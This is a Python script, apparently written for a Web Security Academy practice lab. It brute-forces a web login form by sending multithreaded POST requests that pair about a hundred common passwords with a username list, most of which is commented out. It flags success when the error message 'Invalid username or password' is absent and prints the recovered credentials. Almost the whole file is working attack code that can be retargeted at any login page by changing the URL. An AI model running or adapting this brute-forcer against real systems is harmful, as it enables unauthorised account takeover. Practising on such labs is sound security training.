import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

burp0_url = "https://0a3b00b804afd30381de897100a0005b.web-security-academy.net/login"
burp0_cookies = {"session": "NWG2uGu15U6D1qkxhtt0vxFVxmshFOeM"}
burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Accept-Language": "en-US,en;q=0.9", "Origin": "https://0a3b00b804afd30381de897100a0005b.web-security-academy.net", "Content-Type": "application/x-www-form-urlencoded", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://0a3b00b804afd30381de897100a0005b.web-security-academy.net/login", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i"}


passwd_list = [
    "123456",
    "password",
    "12345678",
    "qwerty",
    "123456789",
    "12345",
    "1234",
    "111111",
    "1234567",
    "dragon",
    "123123",
    "baseball",
    "abc123",
    "football",
    "monkey",
    "letmein",
    "shadow",
    "master",
    "666666",
    "qwertyuiop",
    "123321",
    "mustang",
    "1234567890",
    "michael",
    "654321",
    "superman",
    "1qaz2wsx",
    "7777777",
    "121212",
    "000000",
    "qazwsx",
    "123qwe",
    "killer",
    "trustno1",
    "jordan",
    "jennifer",
    "zxcvbnm",
    "asdfgh",
    "hunter",
    "buster",
    "soccer",
    "harley",
    "batman",
    "andrew",
    "tigger",
    "sunshine",
    "iloveyou",
    "2000",
    "charlie",
    "robert",
    "thomas",
    "hockey",
    "ranger",
    "daniel",
    "starwars",
    "klaster",
    "112233",
    "george",
    "computer",
    "michelle",
    "jessica",
    "pepper",
    "1111",
    "zxcvbn",
    "555555",
    "11111111",
    "131313",
    "freedom",
    "777777",
    "pass",
    "maggie",
    "159753",
    "aaaaaa",
    "ginger",
    "princess",
    "joshua",
    "cheese",
    "amanda",
    "summer",
    "love",
    "ashley",
    "nicole",
    "chelsea",
    "biteme",
    "matthew",
    "access",
    "yankees",
    "987654321",
    "dallas",
    "austin",
    "thunder",
    "taylor",
    "matrix",
    "mobilemail",
    "mom",
    "monitor",
    "monitoring",
    "montana",
    "moon",
    "moscow"
]

username_list = [
    # "carlos",
    # "root",
    # "admin",
    # "test",
    # "guest",
    "info"
    # "adm",
    # "mysql",
    # "user",
    # "administrator",
    # "oracle",
    # "ftp",
    # "pi",
    # "puppet",
    # "ansible",
    # "ec2-user",
    # "vagrant",
    # "azureuser",
    # "academico",
    # "acceso",
    # "access",
    # "accounting",
    # "accounts",
    # "acid",
    # "activestat",
    # "ad",
    # "adam",
    # "adkit",
    # "admin",
    # "administracion",
    # "administrador",
    # "administrator",
    # "administrators",
    # "admins",
    # "ads",
    # "adserver",
    # "adsl",
    # "ae",
    # "af",
    # "affiliate",
    # "affiliates",
    # "afiliados",
    # "ag",
    # "agenda",
    # "agent",
    # "ai",
    # "aix",
    # "ajax",
    # "ak",
    # "akamai",
    # "al",
    # "alabama",
    # "alaska",
    # "albuquerque",
    # "alerts",
    # "alpha",
    # "alterwind",
    # "am",
    # "amarillo",
    # "americas",
    # "an",
    # "anaheim",
    # "analyzer",
    # "announce",
    # "announcements",
    # "antivirus",
    # "ao",
    # "ap",
    # "apache",
    # "apollo",
    # "app",
    # "app01",
    # "app1",
    # "apple",
    # "application",
    # "applications",
    # "apps",
    # "appserver",
    # "aq",
    # "ar",
    # "archie",
    # "arcsight",
    # "argentina",
    # "arizona",
    # "arkansas",
    # "arlington",
    # "as",
    # "as400",
    # "asia",
    # "asterix",
    # "at",
    # "athena",
    # "atlanta",
    # "atlas",
    # "att",
    # "au",
    # "auction",
    # "austin",
    # "auth",
    # "auto",
    # "autodiscover"
]

# Thread-safe printing
print_lock = Lock()
found_credentials = []

def test_credentials(username, password):
    """Test a single username/password combination"""
    try:
        burp0_data = {"username": username, "password": password}
        resp = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, timeout=10)
        
        with print_lock:
            print(f"[-] Testing username:password: {username}:{password}{' ' * 25}", end="\r")
        
        if "Invalid username or password" not in resp.text:
            with print_lock:
                print(f"\n[+] Found credentials: {username}:{password}")
            return (username, password, resp.text)
    except Exception as e:
        with print_lock:
            print(f"\n[!] Error testing {username}:{password} - {str(e)}")
    return None

# Generate all combinations
combinations = [(username, passwd) for username in username_list for passwd in passwd_list]

print(f"[*] Testing {len(combinations)} combinations with multithreading...")

# Use ThreadPoolExecutor for parallel execution
with ThreadPoolExecutor(max_workers=10) as executor:
    futures = {executor.submit(test_credentials, username, passwd): (username, passwd) 
               for username, passwd in combinations}
    
    for future in as_completed(futures):
        result = future.result()
        if result:
            found_credentials.append(result)
            # Optionally cancel remaining tasks
            # for f in futures:
            #     f.cancel()
            # break

if found_credentials:
    print(f"\n[+] Found {len(found_credentials)} valid credential(s):")
    for username, password, _ in found_credentials:
        print(f"    {username}:{password}")
else:
    print("\n[-] No valid credentials found.")
